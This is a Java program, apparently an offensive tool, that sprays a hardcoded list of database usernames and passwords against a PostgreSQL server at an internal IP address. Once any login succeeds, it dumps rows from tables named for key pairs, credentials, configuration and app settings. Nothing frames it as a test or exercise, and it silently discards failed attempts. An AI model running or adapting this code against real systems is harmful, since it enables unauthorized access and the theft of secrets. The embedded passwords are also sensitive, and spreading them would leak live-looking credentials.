import java.sql.*;
class DF4 {
  public static void main(String[] a) throws Exception {
    Class.forName("org.postgresql.Driver");
    String[][] creds = {
      {"noxify","cZskyJqqE7?7V_8=#Ed^"},
      {"neo","BJwx+sAC6jreaV45"},
      {"accurate","BashShell%729#Acc5"},
      {"acls","kutul0nc4t"},
      {"acls","BJwx+sAC6jreaV45"},
      {"sermo","BJwx+sAC6jreaV45"},
      {"sermo","kutul0nc4t"},
      {"gemini","BJwx+sAC6jreaV45"},
      {"chatwoot","BJwx+sAC6jreaV45"}
    };
    String[][] targets = {
      {"acls","digital_key_pair"},
      {"acls","configuration"},
      {"sermo","accurate_credential"},
      {"_accurate_mcp","app_setting"},
      {"chatwoot","installation_configs"}
    };
    for(String[] t : targets) {
      System.out.println("=== "+t[0]+"."+t[1]+" ===");
      for(String[] cr : creds) {
        try {
          Connection c = DriverManager.getConnection("jdbc:postgresql://10.13.17.248:5501/"+t[0],cr[0],cr[1]);
          ResultSet r = c.createStatement().executeQuery("SELECT * FROM "+t[1]+" LIMIT 5");
          ResultSetMetaData md = r.getMetaData();
          for(int i=1;i<=md.getColumnCount();i++) System.out.print(md.getColumnName(i)+"|");
          System.out.println(" [user="+cr[0]+"]");
          while(r.next()) { for(int i=1;i<=md.getColumnCount();i++){String v=r.getString(i);System.out.print((v!=null?v.substring(0,Math.min(150,v.length())):"null")+"|");}System.out.println(); }
          c.close();
          break;
        } catch(Exception e) {}
      }
    }
  }
}
